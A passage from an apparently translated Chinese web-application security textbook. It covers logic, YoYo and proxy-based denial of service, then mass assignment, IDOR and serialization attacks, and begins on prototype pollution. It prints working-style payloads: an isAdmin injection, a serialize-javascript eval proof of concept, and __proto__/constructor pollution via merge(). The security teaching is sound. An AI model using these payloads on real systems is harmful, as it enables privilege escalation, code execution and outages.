| ababababababababababab (22 字符)       | <1 ms                     |
| abababababababababababab (24 字符)     | <1 ms                     |
| ababababababababababababab (26 字符)   | <1 ms                     |
| abababababababababababababab (28 字符) | >1 ms                     |

这意味着，Web 应用程序中使用的恶意正则表达式可能会潜伏数年，直到黑客找到一个导致正则表达式解析器执行大量回溯的输入。因此，它看起来像是凭空出现的。

正则表达式拒绝服务（Regex DoS，即 ReDoS）攻击比你想象的要常见得多，如果能找到合适的 Payload（有效载荷），很容易使服务器瘫痪或使客户端机器失效。需要注意的是，开源软件（Open Source Software，OSS）往往更容易受到恶意正则表达式的影响，因为很少有开发人员能够检测出恶意正则表达式。

### 逻辑 DoS 漏洞

利用逻辑 DoS 漏洞，服务器资源会被非授权用户耗尽。结果，合法用户会遭遇性能下降或服务中断。

正则表达式是了解 DoS 漏洞和利用 DoS 的一个简单入门，因为它为研究和尝试攻击提供了一个集中的起点（任何存在正则表达式解析器的地方）。然而，需要注意的是，由于 DoS 的广泛性，几乎在任何类型的软件中都能找到 DoS 漏洞！

逻辑 DoS 漏洞是极难发现和利用的漏洞之一，但它们在实际环境中出现的频率比预期的要高。这些漏洞需要一定的专业知识才能定位和利用，但在掌握了寻找其中一些漏洞的技巧之后，你可能就能发现很多类似的漏洞。

首先，我们需要思考是什么让 DoS 攻击奏效。DoS 攻击通常围绕着消耗服务器或客户端的硬件资源展开，使这些资源无法用于合法用途。这意味着我们首先要在 Web 应用程序中寻找那些资源密集型的环节。一个不完全的列表可能包括：

* 任何你可以确认是同步运行的操作
* 数据库写入
* 磁盘写入
* SQL 联接（SQL join）
* 文件备份
* 循环逻辑操作

通常，Web 应用程序中复杂的 API 调用不仅包含一个，而是包含多个此类操作。例如，一个照片分享应用程序可能会暴露一个允许用户上传照片的 API 路由。在上传期间，该应用程序可能会执行：

* 数据库写入（存储关于照片的元数据）
* 磁盘写入（记录照片已成功上传的日志）
* SQL 联接（累积有关用户和相册的足够数据以填充元数据写入）
* 文件备份（以防灾难性的服务器故障）

我们无法轻易计时那些我们没有访问权限的服务器上的这些操作耗时，但我们可以结合计时和估算来确定哪些操作比其他操作更耗时。例如，我们可以先对请求从开始到结束进行计时。这可以使用浏览器开发者工具来完成。

我们还可以通过同时多次发起相同的请求，并观察响应是否交错出现，来测试某个操作是否在服务器上同步发生。每次这样做时，我们都应该编写脚本，并对大约 100 次 API 调用求平均值，这样我们的指标就不会因随机差异而出现偏差。

也许在我们测试时，服务器刚好遇到了流量高峰，或者开始执行一个资源密集型的定时任务（Cron job）。对请求时间求平均值可以让我们更准确地衡量哪些 API 调用会消耗大量时间。

我们还可以通过仔细分析网络 Payload 和 UI 来近似估算后端代码的结构。如果我们知道应用程序支持以下这些类型的对象：

* 用户对象
* 相册对象（用户拥有相册）
* 照片对象（相册拥有照片）
* 元数据对象（照片拥有元数据）

那么我们可以看到每个子对象都通过一个 ID 来引用：

```javascript
// photo #1234
{
 image: data,
 metadata: 123abc
}
```

我们可能会假设用户、相册、照片和元数据根据所使用的数据库是 SQL 还是 NoSQL 存储在不同的表或文档中。如果在我们的 UI 中，我们发出一个查找与用户关联的所有元数据的请求，那么我们就会知道后端一定在运行一个复杂的联接操作或迭代查询。让我们假设在端点 `GET /metadata/:userid` 处找到了这个操作。

此操作’的规模因用户使用应用程序的方式而异。高级用户可能需要大量的硬件资源来执行此操作，而新用户则不需要。

我们可以测试此操作并观察其如何扩展，如表 14-3 所示。

表 14-3. 按账户类型分类的 `GET /metadata/:userid` 响应时间

| 账户类型 (Account type)          | 响应时间 (Response time) |
| :------------------------------- | :----------------------- |
| 新账户 (1 个相册, 1 张照片)      | 120 ms                   |
| 普通账户 (6 个相册, 60 张照片)   | 470 ms                   |
| 高级用户 (28 个相册, 490 张照片) | 1,870 ms                 |

鉴于该操作根据用户账户类型扩展的方式，我们可以推断出，我们可以通过 `GET /metadata/:userid` 创建一个消耗服务器资源时间的配置文件。如果我们编写一个客户端脚本，将相同或相似的图像重新上传到范围广泛的相册网络中，我们就可以拥有一个包含 600 个相册和 3500 张照片的账户。

随后，只需对端点 `GET /metadata/:userid` 发起重复的请求，就会导致其他用户的服务器性能显著下降，除非服务端代码极其健壮并且在单个请求的基础上限制了资源。这些请求有可能只是超时，但即使服务器软件超时且不向执行请求的客户端发送结果，数据库很可能仍然在调配资源。

这只是如何发现和利用逻辑 DoS 攻击的一个例子。当然，这些攻击因案例而异——因此被称为你所利用的应用程序中由特定应用逻辑定义的“逻辑 DoS”。

### 分布式 DoS

利用 DDoS，服务器资源会被大量的非授权用户耗尽。因为他们是在大规模发起请求，所以他们甚至可能只是执行标准请求。在规模化的情况下，这会彻底淹没合法用户的服务器资源。`

DDoS 攻击超出了本书全面介绍的范围，但你至少应该在概念上熟悉它们是如何工作的。与单个黑客针对另一个客户端或服务器以减慢其速度的 DoS 攻击不同，分布式攻击涉及多个攻击者。攻击者可以是其他黑客或网络化的机器人（僵尸网络 [Botnet]）。

从理论上讲，这些机器人可以利用任何类型的 DoS 攻击，但其规模要大得多。例如，如果服务器在其 API 端点之一中使用了正则表达式，则僵尸网络可以让多个客户端同时向同一个 API 端点发送恶意 Payload。然而在实践中，大多数 DDoS 攻击并不执行基于逻辑或正则表达式的 DoS，而是在较低层级（通常是在网络层级，而不是应用层级）发起攻击。大多数基于僵尸网络的 DDoS 攻击会直接针对服务器的 IP 地址发起请求，而不是针对任何特定的 API 端点。这些请求通常是用户数据报协议（User Datagram Protocol，UDP）流量，企图淹没服务器为合法请求提供的可用带宽。

正如你想的那样，这些僵尸网络通常不是由单个黑客拥有的设备，而是黑客或黑客组织通过互联网上发布的恶意软件控制的设备。它们是由真实的人拥有的真实计算机，但安装了允许被远程控制的软件。这是一个大问题，因为这使得检测非授权客户端变得更加困难。（它们是真实用户吗？）

如果你获得了对僵尸网络的访问权限，或者可以出于安全测试目的模拟僵尸网络，那么尝试结合网络层和应用层的攻击将是明智的选择。

任何上述针对服务器运行的 DoS 攻击都容易受到 DDoS 的影响。一般来说， DDoS 攻击对单个客户端无效，尽管播种大量容易受到正则攻击的 Payload，随后将其传递到客户端设备并执行可能属于 DDoS 的范围。

### 高级 DoS

虽然本章已经介绍了最常见的 DoS 攻击类型，但由于 DoS 的性质，还存在许多晦涩且不那么常见的形式。任何降低或妨碍 Web 应用程序可用性的自动化尝试，无论其来源如何，都可以被视为拒绝服务。

#### YoYo 攻击

约约攻击（YoYo Attacks）是一种通过 DoS 攻击 Web 应用程序的更现代的方法，它利用了大型云提供商（如亚马逊云服务 [Amazon Web Services，AWS] 或谷歌云平台 [Google Cloud Platform，GCP]）中内置的自动弹性伸缩（Autoscale）功能。自动伸缩器（Autoscaler）背后的理论是，Web 应用程序可以在流量较少时使用有限的计算资源（例如，低 CPU、低内存）以节省成本。然而，当负载增加时，云提供商会自动增加分配给给定 Web 应用程序的计算资源——随之而来的是硬件账单的增加。

YoYo 攻击依赖于这种自动伸缩功能，攻击者在短时间内向 Web 应用程序发送海量请求，从而触发自动伸缩器增加硬件资源。云提供商会为目标 Web 应用程序扩展计算资源，但紧接着流量却突然停止。在此时，云提供商很快将不得不开始减少计算资源。

一旦计算资源缩减回基线，攻击者便会开始另一轮猛烈的请求，以再次触发资源扩容。这个过程被一遍又一遍地重复。

YoYo 攻击不仅在进行硬件重新分配的期间导致终端用户的用户体验下降，而且还会导致云托管成本激增。如果攻击持续一段相当长的时间，这些成本可能会非常高昂。

#### 压缩攻击

允许文件上传的应用程序通常容易受到涉及畸形文件的应用层 DoS 攻击。考虑一个类似于 YouTube 的视频托管网站：此类网站接受视频文件形式的上传，但在将其提供给终端用户之前，会通过压缩器和优化器（例如 FFMPEG）运行视频文件。这个过程减轻了带宽压力，并确保所有视频都采用浏览器兼容的文件格式。

然而，在压缩和优化步骤中，必须解析终端用户提供的原始视频文件。在这种情况下，精心制作的视频文件可能会显著消耗服务端的计算资源，这会降低所有其他使用该服务的用户的体验。

随着越来越多的网站依赖用户提交的数据，这些形式的 DoS 漏洞变得越来越普遍。例如，CVE-2021-38094 描述了针对开源 FFMPEG（版本 4.1）视频压缩和转换库的此类攻击。

在 CVE-2021-38094 的场景中，通过 FFMPEG 运行的、包含超出有效输入文件预期范围的数据的视频文件将触发 `libavfilter/vf_convolution.c` 文件中 `filter_sobel()` 函数内的一个整数溢出漏洞。一旦发生此溢出，就会引发一系列有问题的函数调用，从而导致非常高的 CPU 和内存消耗，并可能导致 FFMPEG 进程崩溃。这当然会降低或中断依赖 FFMPEG 的服务，从而影响其他合法用户。

基于压缩的 DoS 攻击通常很难发现，因为许多 Web 应用程序依赖第三方软件来处理文件上传。像 FFMPEG 和 ImageMagick 这样的工具为开发人员简化了复杂文件的上传和处理，但同时也为攻击者构建和利用畸形上传 Payload 暴露了巨大的攻击面。

#### 基于代理的 DoS

实施 DoS 攻击通常需要攻击者自身拥有庞大的计算资源。在攻击具有庞大计算资源的 Web 应用程序时，为了发起足够多的请求以降低用户性能，通常需要付出高昂的成本。

在这些情况下，一些攻击者会寻找能从合法 Web 应用程序中窃取计算资源，并将该 Web 应用程序的网络请求重新定位到目标网站的机制。这降低了 DoS 攻击的成本，并使受害者的 Web 应用程序更难确定是谁发起了攻击。

考虑像谷歌（Google）、必应（Bing）或雅虎（Yahoo!）这样的搜索引擎。这些搜索引擎拥有庞大的计算资源，专门用于抓取和缓存来自新网站的数据。

这些爬虫会扫描新发现的网站，对其进行评分，并将部分数据存储在它们自己的数据库中。在爬虫运行时，每个请求的页面都需要少量的计算资源。有趣的是，大多数 Web 应用程序开发人员会有意在他们的 `robots.txt` 文件中将爬虫列入允许列表，以便让他们的应用程序被索引，从而使更多的合法用户能够找到它们。

既然这些搜索引擎爬虫一开始就拥有庞大的计算资源，那么有时就有可能“欺骗”爬虫，使其出于 DoS 的目的向目标网站推送过多的抓取请求。通过使用将请求代理到目标 Web 应用程序的新域名和子域名，黑客可以诱骗爬虫一遍又一遍地索引相同的内容。扩展到成千上万或数百万个子域名后，就有可能通过这种方法显著降低 Web 应用程序的性能，而无需你自己支付攻击所需的所有计算资源。

我将这些形式 of DoS 攻击称为基于代理的 DoS，因为黑客利用了诸如搜索引擎之类的中间服务向目标 Web 应用程序发送流量，而不是自己直接向目标发送流量。随着 Web 应用程序（尤其是用于测试和抓取其他 Web 应用程序的 Web 应用程序）的发展，这种形式的攻击在黑客中将变得越来越普遍。

### 总结

经典的 DDoS 攻击是迄今为止最常见的 DoS 形式，但它们只是旨在消耗服务器资源以使合法用户无法使用资源的众多攻击之一。DoS 攻击可以发生在应用程序栈（Application Stack）的许多层——从客户端、服务器，在某些情况下甚至在网络层。这些攻击可以一次影响一个用户或众多用户，其破坏程度可能从降低应用程序性能到完全锁定应用程序。

在寻找 DoS 攻击时，最好先调查哪些服务器资源最宝贵，然后开始尝试寻找使用这些资源的 API。服务器资源的价值因应用程序而异，但可能是一些标准资源，如内存（RAM）/CPU 使用率，也可能是更复杂的资源，例如在队列中履行的功能（用户 a → 用户 b → 用户 c，等等）。

虽然通常只会引起烦恼或服务中断，但一些 DoS 攻击也会泄露数据。请密切注意由于任何 DoS 尝试而出现的日志和错误。

***

## 第 15 章 攻击数据与对象

大多数现代编程语言在实现逻辑程序设计时，都会利用两种截然不同的功能：数据（通常以对象的形式表示）和行为（最常以函数的形式表示）。即使在不采用面向对象编程（Object-Oriented Programming，OOP）的编程语言中，对象通常仍被定义为第一类公民（First-class citizen）。

“第一类公民”是一个编程语言设计概念，用来指代编程语言中的一种实体，该实体可以被赋值、重新赋值、修改、作为参数传递给函数以及从函数中返回。几乎所有现代编程语言都将对象（数据）定义为第一类公民，但并非所有现代语言都将函数（行为）定义为第一类公民。因此，可以说大多数现代编程语言将“存储数据”和“操作数据”的角色拆分成了两个截然不同的语言特性。

本章将全面介绍在数据以对象形式存储并通过函数进行操作时，如何对其进行利用。这些技术适用于众多现代编程语言，并且滥用了将数据作为第一类公民存储所带来的强大副作用。

### 批量赋值

攻击第一类对象的第一种也是最常见的方法是批量赋值（Mass Assignment）攻击。虽然目前通常使用现代标准术语“批量赋值攻击”或“批量赋值漏洞（Mass assignment vulnerability）”，但在历史上，此类攻击也被称为自动绑定攻击（Autobinding attack）（在 Spring MVC 和 ASP.NET 框架的情况下）以及对象注入攻击（Object injection attack）（在传统 PHP 漏洞的情况下）。所有这些术语指的都是同一种利用体系。

批量赋值漏洞允许攻击者通过在对象中传递额外的字段，给一个不验证键值（Key）的函数调用，从而修改那些原本不应该被修改的字段。虽然这听起来有些令人困惑，但在看完本节中的示例后，它将变得非常容易识别。

批量赋值漏洞通常存在于在函数之间频繁传递大量状态相关数据（以对象形式）的系统中。一个容易受到批量赋值影响的典型应用示例是定期传递用户状态信息的电子游戏。另一种可能存在漏洞的应用类型是实现了“动态表单”的 Web 应用程序，或者是允许终端用户修改其标题、数据类型等的表单。如果在这两类应用程序的设计中没有考虑安全性，它们很可能会通过批量赋值受到攻击。

让我们花一分钟评估一下以下代码片段，它们描述了一种常见的批量赋值漏洞形式：

```javascript
/*
 * This is a server-side API endpoint for updating player data
 * for the web-based video game "MegaGame".
*/
app.post("updatePlayerData", function(req, res, next) {
// if client sent back player state data, update in the database
if (!!req.body.data) {
 db.update(session.currentUser, req.body.data);
 return res.sendStatus(200); // success
} else {
 return res.sendStatus(400); // error
}
});
```

在这个批量赋值漏洞的示例中，网络游戏 “MegaGame” 实现了一个可通过 HTTP POST 访问的 API 端点。该端点以状态对象的形式从客户端（Web 浏览器）接收一个参数。在状态对象不为空的前提下，该 API 端点会调用一个数据库助手库，以使用客户端提供的状态（代表正在玩游戏的用户）来更新当前用户的游戏状态。

API 端点中引用的 `db.update()` 函数编写如下：

```javascript
const update = function(data) {
for (const [key, value] of Object.entries(data)) {
 database.upsert({ `${key}`: `${value}` })
}
}
```

请注意，此 `update()` 函数中的问题（漏洞）并不在于它更新插入（Upsert，即不存在则插入，存在则更新）了客户端提供的数据。相反，批量赋值漏洞的出现是因为该函数没有验证客户端提供的任何信息，特别是对于 data 对象中的键。

该应用程序开发人员的设想是，客户端将返回包含以下数据的 Payload：

```javascript
const data = {
playerId: 123,
playerPosition: { "x": 125, "y": 346 },
playerHP: 90
};
```

由于 `update()` 函数缺乏任何验证，并且原封不动地接受来自客户端的数据，因此黑客可以在传输途中修改 Payload，或发送包含以下数据的恶意 Payload：

```javascript
const data = {
playerId: 123,
playerPosition: { "x": 125, "y": 346 },
playerHP: 90,
isAdmin: true // this is the "attack" portion of the payload
};
```

通过修改 Payload 以包含 `isAdmin` 键，`update()` 函数将在用户的数据库行中写入或修改 `isAdmin` 条目。现在，通过滥用 `update()` 函数中未进行过滤和验证这一事实，用户已将其游戏内角色提升为管理员。如果 `update()` 函数验证了对象的键并过滤了 `isAdmin` 键，那么这个发送到 `updatePlayerData` 端点的恶意 Payload 就不会导致任何角色更新。

这是批量赋值漏洞的一个极佳示例，它是对象漏洞最常见、也最容易利用的形式之一。

### 不安全的直接对象引用

不安全的直接对象引用（Insecure Direct Object Reference，IDOR）攻击是一种常见的 Web 应用程序漏洞，在 2007 年被加入 OWASP Top 10 漏洞列表时受到了广泛关注。自那时起，IDOR 漏洞在 Web 上已经不那么常见了；然而，由于其简单的本质，它们仍不时出现，并且几乎不需要任何技巧就能加以利用。

当服务器上的对象可以直接通过用户提供的参数（例如 URL 查询参数、HTTP POST 主体或 URL 中的 `:id` 字段）进行访问时，就会发生 IDOR 漏洞。由于信任终端用户会提供正确的参数来引用服务器上的特定对象，终端用户极有可能访问到其他对象，从而导致权限提升。

考虑以下 HTTP POST 端点：

```javascript
app.get('/files/:id', function(req, res, next) => {
 return res.sendFile(`/filesystem/files/${req.params.id}`);
});
```

给定一个由 `:id` 表示的文件名，该端点将返回 `/filesystem/files` 下的任何文件。在客户端，开发人员的预期可能是终端用户可以访问一个特定的文件。例如，开发人员可能希望终端用户能够下载一个名为 `my-report-card.txt` 的文件。

为了请求 `my-report-card.txt` 文件，终端用户的浏览器将发出以下请求：

`HTTP GET https://mywebsite.com/files/my-report-card.txt`

攻击该 IDOR 非常简单：只需在浏览器中拦截 HTTP GET 请求并修改文件名即可。或者，使用 Burp Suite 或 ZAP 等 HTTP 代理工具在请求到达服务器之前对其进行拦截并修改。

如果将文件名更改为 `other-report-card.txt`，即使当前用户原本无权访问该文件，服务器仍会尝试返回文件 `other-report-card.txt`。出于这些原因，IDOR 除了是一种通过对象引用来针对对象的攻击外，也是权限提升的一种形式。

### 序列化攻击

当数据在浏览器客户端、服务器和各种服务之间来回传递时，以原始格式发送通常是不切实际、代价高昂且困难的。为了解决这个问题，许多 Web 应用程序在通过网络发送原始数据之前对其进行序列化（Serialization）操作。

#### Web 序列化解析

序列化中的一个重要核心概念是，序列化后的格式应该易于反序列化（Deserialize），即还原为其原始数据格式。此外，它的格式应该便于在需要时轻松存储在磁盘上。

序列化的一项示例是从浏览器的 JavaScript 执行上下文中获取内存中的对象，并将其转换为 JavaScript 对象简谱（JavaScript Object Notation，JSON）。代表一个序列化农民（farmer）类的 JSON 数据块（Blob）如下所示：

```json
{
 "name": "Joe Carrot",
 "age": 62,
 "location": "Montana, USA",
 "crops": {
 "wheat": {
 "measurement": "acres",
 "amount": 100
 }
 }
}
```

在本例中，与农民 “Joe Carrot” 关联的数据可以很容易地存储在磁盘上或通过网络传输。每当需要时，它都可以被反序列化并加载到内存中——创建新的内存地址 and 指针，并允许编程语言对其进行修改。

Web 应用程序中用于数据序列化的其他常见格式还包括 XML、YAML 和 base64（一种用二进制序列化文本的格式）。

#### 攻击薄弱的序列化

通过序列化攻击来攻击 Web 应用程序的第一步是在应用程序中找到执行数据序列化的函数。下一步是对该函数使用测试数据，以便对比分析一组序列化函数的输入和输出。

考虑一下流行的 npm 库 `serialize-javascript`。该库每周的下载量超过 3000 万次，并被用于成千上万个基于 JavaScript 的应用程序中。然而，3.0.9 及更低版本在使用其 `serialization()` 函数作为 Payload 的传递机制时，容易受到代码注入（Code Injection）攻击。

在这种情况下，将 Payload `{"foo": /1"/, "bar": "a\"@__R-<UID>-0__@"}` 输入到 `serialization()` 函数中会产生如下序列化 JSON：`{"foo": / 1"/, "bar": "a\/1"/}`。生成的 JSON 对象的结构转义了引号（这原本是正常 JSON 对象的预期组成部分），从而导致如果它在 `eval()` 函数中运行，就会产生代码执行。

像 `eval('('+ serialize({"foo": /1" + console.log(1) /i, "bar": '"@__R-<UID>-0__@'}) + ')');` 这样的概念验证（Proof of Concept）将导致代码执行，这是由于序列化器无法将该输出字符串格式化为经过正确转义的 JSON。

所有序列化攻击都遵循相同的步骤：

1. 找到执行序列化的函数。
2. 仔细阅读该函数，或使用常见的 Payload 对其进行测试。
3. 在发现无法正确序列化数据后，创建一个能够执行脚本的 Payload。
4. 使用能够执行脚本的 Payload 调用该函数。
5. 获取远程代码执行（服务端）或 XSS（客户端）。

由于大多数网站不实现自己的序列化器，因此可以寻找开源的、存在漏洞的序列化器，并扫描存在漏洞的应用程序和方法。这是一种高级攻击技术，但它是现实世界中发现和利用序列化漏洞的最佳方法之一。

### 总结

尽管 Web 在过去几年中发生了巨大的演变，但 Web 编程语言仍在使用已经存在了很长时间的编程语言设计模式。当你开始理解任何复杂应用程序底层的系统时，它们在底层如何被利用就变得显而易见了。本章中针对对象和数据的攻击旨在展示，即使在编程语言设计改进了数十年之后，底层系统通常仍是黑客可行的攻击目标。

***

## 第 16 章 客户端攻击

在应用安全的前现代世界（Web 1.0）中，人们普遍认为 Web 应用程序的客户端（即浏览器）组件并不是黑客常用的攻击媒介。因此，企业认为应用程序的大部分风险暴露面都在后端（服务端），而极少投入精力来确保其浏览器客户端的安全。

随着 Web 2.0 的到来，越来越多以前只存在于服务端的逻辑被推向了客户端。复杂的计算操作从后端的 Java 或 C 语言重写为客户端的 JavaScript。后端数据存储被本地存储（Local Storage）、会话存储（Session Storage）或 IndexedDB 所取代。

异步 JavaScript 和 XML（Asynchronous JavaScript and XML，AJAX）类型的网络查询允许开发客户端应用程序来维护、更新和存储状态。JavaScript 编程语言和浏览器 DOM 的客户端改进，使得复杂组件能够像桌面应用程序一样进行更新、渲染、重新渲染、删除等生命周期管理。

总而言之，Web 应用程序的整体架构发生改变：从服务器负责所有计算操作且客户端仅作为渲染（视图）层的模式，转变为服务器和客户端共同负责各种复杂计算任务的模式。

现代 Web 反映了这一变化：世界上所有大型网站都同时使用复杂的服务端和客户端功能。服务器不再是处理复杂计算操作的唯一机制，因此，安全专业人员需要迅速提升自身技能，以便能够协助交付安全的服务器端软件以及安全的客户端软件。

本章涵盖了以客户端而非服务器作为目标来利用 Web 应用程序的常用方法。

### 攻击浏览器客户端的方法

首先，在思考客户端攻击（Client-side attack）时，请先排除服务器。客户端攻击是指任何不需要存在漏洞的 Web 服务器，也不需要对客户端服务器发起网络调用即可实施的攻击（可利用的漏洞）形式。从类别上讲，攻击浏览器客户端主要有两种方式：客户端指向型攻击（Client-targeted attacks）和客户端特异型攻击（Client-specific attacks）。

#### 客户端指向型攻击

首先，存在一些既可以影响客户端也可以影响服务器的通用漏洞形式。我们在前一章评估的正则表达式拒绝服务（Regular Expression Denial of Service，ReDoS）漏洞就是一个例子。

正则表达式是一种常见的编程工具，几乎在所有主流服务端语言（如 Java、C#、Python）中都有实现，但它们也存在于浏览器（JavaScript）和其他较少见的客户端（如 Adobe Air）中。ReDoS 攻击并不总是客户端攻击，但当浏览器客户端上的 JavaScript 代码结构使得客户端在不需要任何网络调用或服务器交互的情况下就存在漏洞时，它偶尔也可能成为客户端攻击的一种形式。

#### 客户端特异型攻击

接下来是仅存在于客户端、且很可能永远不会出现在服务端（除非服务器试图模拟 Web 浏览器）的客户端攻击。我们在第 10 章中介绍了基于 DOM 的跨站脚本（DOM-based cross-site scripting，DOM XSS）。这是仅对浏览器客户端有效的客户端攻击的典型示例。

在 DOM XSS 中，与存储型或反射型 XSS 不同，接收器（Sink）和源（Source）都发生在浏览器中。例如，来自 `window.location.hash` 的字符串通过 `eval()` 被渲染到代码中，从而导致客户端脚本执行。

出于这些原因，DOM XSS 是客户端攻击的典型代表。与 DOM XSS 和 ReDoS 一样，我们在本章中讨论的其他攻击也完全可以在浏览器客户端内部发生。然而，在深入研究具体攻击之前，我们先来看看为什么客户端攻击如此重要。

### 客户端攻击的优势

在 DOM XSS 攻击中，接收器和源都仅存在于浏览器 DOM 中。这意味着，DOM XSS（以及许多其他客户端攻击）可以在任何 Web 服务器都未察觉到攻击发生的情况下被利用。

Payload（有效载荷）可以直接发送给浏览器客户端，从而避开可能正在记录网络流量并试图发现畸形请求的 Web 服务器。出于这些原因，客户端攻击通常是成熟企业最难检测的漏洞类型之一。

作为一名白帽黑客，这意味着有可能在不被追踪或发现的情况下对用户进行漏洞利用。作为一名漏洞赏金猎人，这意味着黑客在客户端上利用的脆弱面不太可能被发现和修复，从而带来更高的发现概率。

除了不需要服务器联网使得客户端攻击能够悄无声息地溜走之外，客户端攻击对于恶意用户来说也更容易在不被发现的情况下进行开发。考虑一下黑客试图针对 Web 服务器开发漏洞利用程序的情况。在复杂的 Web 应用程序中，第一个开发出的 Payload 很难成功渗透并绕过所有现有的安全机制。因此，通常需要多次尝试发送 Payload。

事实上，大多数成功的黑客都会将这些尝试自动化以节省时间。他们通常每小时发送几十个 Payload，直到有一个起作用。所有这些网络请求都会增加被人员、防火墙或网络扫描工具检测到的概率。

利用客户端攻击，黑客可以轻松地从企业下载完整的 HTML/CSS/JS 客户端 Web 应用程序，然后切断网络连接。从那时起，就可以对本地客户端应用程序进行数百万次攻击尝试，而无需向其生产 Web 服务器发送任何数据。

### 原型链污染攻击

近年来，随着 npm 和其他 JavaScript 包管理器的兴起，原型链污染（Prototype pollution）攻击也呈上升趋势。原型链污染是一种仅针对使用原型继承（Prototypal inheritance）系统（例如 JavaScript）的语言有效的攻击形式，这种继承形式不同于 Java、C# 或其他流行语言中的传统 OOP 继承。原型链污染攻击允许你通过污染你*有权*访问的对象，来破坏你*无权*访问的对象，而这两个对象之间共享原型继承关系。

#### 理解原型链污染

考虑以下在客户端 JavaScript 中编写的代码片段：

```javascript
const Technician = function(name, birthdate, paymentId) {
 this.name = name;
 this.birthdate = birthdate;
 this.paymentId = paymentId; // for paying for jobs
}
```

上述函数是在原型编程语言中实现的伪类（Pseudo-class）或类样结构。使用这个伪类，你可以将派生自它的对象实例化为一种蓝图，该对象将继承父伪类的状态和函数。这里有一个例子：

```javascript
const Bob = new Technician("Bob", "12/01/1970", 12345);
console.log(Bob.toString()); // [object Object]
```

JavaScript 和其他基于原型继承的语言存储这些数据的方式是在所谓的原型链（Prototype chain）内部。在 JavaScript 中，每个对象都有自己的原型，其中包含指向它继承函数和数据的所有祖先对象的引用。

我们可以通过对比 `Bob` 的原型与 `Technician` 的原型，来验证 `Bob` 确实是一名技术员（technician）。需要注意的是，在此情况下，我们要使用 `Bob.__proto__` 来访问 `Bob` 的原型信息，并将其与 `Technician.prototype` 进行比较。这是因为 `__proto__` 指向实际的原型对象，而 `prototype` 指向构建更多原型的蓝图。由于 `Technician` 是构建实例 `Bob` 的构造函数，因此当使用等价运算符比较两者时，它将返回 `true`：

```javascript
Bob.__proto__ == Technician.prototype; // true
```

除了验证 `Bob` 是技术员之外，我们还可以通过两种方式之一来验证 `Bob` 是一个对象（Object）。首先，知道 `Bob` 继承自 `Technician`，我们可以手动向上追溯继承链，因为 `Technician` 不继承自其他自定义对象：

```javascript
Bob.__proto__.__proto__ == Object.prototype; // true
```

接下来，我们可以使用 `instanceof` 运算符来再次确认 `Bob` 确实是 `Object` 的实例，因为它是 `Technician` 的实例，而 `Technician` 继承自 `Object`（所有的 JavaScript 函数也是如此）：

```javascript
Bob instanceof Object; // true
```

我们也可以使用 `instanceof` 运算符来确认 `Bob` 是 `Technician` 的实例。可以将此运算符视为快捷方式，而无需手动去追溯原型链：

```javascript
Bob instanceof Technician; // true
```

有了这些新知识，我们可以得出该应用程序的继承层级如下：

`(Object) -> (Technician) -> (Bob)`

在部署原型链污染攻击以破坏基于 JavaScript 原型构建的应用程序之前，最后一件事是了解信息是如何通过原型链传播的。

此前，我们针对对象 `Bob` 调用了函数 `toString()`。当我们这样做时，尽管 `Bob` 上没有定义返回此字符串的函数，但它返回了字符串 `[object Object]`。这是因为 `Object` 包含 `toString()` 函数，当某个函数被调用但在当前对象上未找到时，解释器会向上遍历原型链的每一层，直到找到同名函数。

如果在遍历原型的过程中没有找到被调用的函数，则会抛出错误。然而，如果父类包含适当命名的函数，则会调用该函数来代替当前类上的函数。

换句话说，`toString()` 函数在 `Bob` 上并不存在。因为该函数在 `Bob` 上不存在，解释器将向上遍历原型链，在 `Technician` 处停下，最后在 `Object` 处停下，并在那里最终找到了适当命名的 `toString()` 函数。此过程在表 16-1 中列出。

表 16-1. 原型链

| 步骤编号 | 调用的函数 | 评估的类   | 是否找到？ |
| :------- | :--------- | :--------- | :--------- |
| 1        | toString() | Bob        | False      |
| 2        | toString() | Technician | False      |
| 3        | toString() | Object     | True       |

在这种情况下，我们可以在甚至无法访问 `Bob` 的情况下，对 `Bob` 类实施原型链污染。如果我们能找到一个修改 `Technician` 或 `Object` 原型的函数，我们就可以改变 `toString()` 函数的功能，从而使 `Bob` 也受到影响。

考虑以下原型链污染 Payload，尽管它没有直接针对 `Bob` 类，但它对 `Bob` 类有效：

```javascript
// adds functionality to technician class
const addTechnicianFunctionality = function(obj) {
 Technician.prototype[obj.name] = obj.data
}

// user input payload
{
 name: "toString",
 data: `function() { console.log("polluted!"); }`
}

Bob.toString(); // prints "polluted!"
```

在这种情况下，用户界面预期 `Technician` 将是一个用于客户端状态管理目的的可调整类，但它没有料到 `Bob` 也是可调整的。通过更改 `Technician` 原型上的 `toString` 函数，`Bob` 的 `toString` 函数也被污染了。

原型链污染攻击利用了如前所述原型继承系统向上和向下遍历原型链的事实。这允许攻击者污染单个对象，然后将其有效“传播”到附近可能无法直接作为目标的关联对象。

#### 利用原型链污染进行攻击

此前，我们讨论了原型和原型链遍历的工作原理。我们现在掌握了以下知识：如果当前对象中不存在某个函数或属性，它将向上遍历链，直到找到具有相同名称的函数或属性。

当客户端无法执行完整的脚本（XSS）时，很可能会有很多合并（merge）和更新（update）原型的场景。这些就是我们利用原型链污染攻击的攻击面。

考虑 npm 开源 JavaScript 包 `merge v2.0`。尽管其语法简单，但该包在网络上被广泛指出容易受到原型链污染攻击。`merge` 库有一个 `merge()` 函数，该函数只是将两个对象组合在一起。它在 Node.js 服务端或基于 JavaScript 的客户端上进行状态建模时经常被使用。

让我们尝试再次污染 `Bob` 对象，以便添加一个新属性 `isAdmin: true`。假设我们在客户端 JavaScript 代码中发现了一段使用 `merge()` 函数将 `Object` 和 `userData` 组合在一起的代码片段。对 `Object` 使用 `{ isAdmin: true }` 负载将导致 `Object` 获得 `{ isAdmin: true }` 属性，但这不会反映在 `Bob` 上，因为 `Object` 原型尚未被更新。

我们可以通过以下 Payload 看到这次攻击尝试的结果：

```javascript
merge(Object, { isAdmin: true });

console.log(Bob.isAdmin); // undefined
```

然而，当我们发送针对原型的 Payload 时，我们看到了不同的结果：

```javascript
merge(Object, { "__proto__.isAdmin": true });

console.log(Bob.isAdmin); // true
```

在这里，我们成功地污染了 `Object` 原型，使得 `Bob` 也变得易受攻击。

请注意，这个特定的库也容易受到构造函数污染（Constructor pollution）的影响。除了直接污染 `Object` 原型外，我们还可以污染构造函数（Constructor），该函数由 JavaScript 语言自动附加到 `Object` 上，并在每次创建 `Object` 实例时使用：

```javascript
merge(Object, { "constructor.prototype.isAdmin": true });

console.log(Bob.isAdmin); // true
```

在这种情况下，每个继承自 `Object` 的实例都会调用构造函数，从而导致产生与直接污染 `Object` 原型相同的净效果。

#### 原型链污染的原型

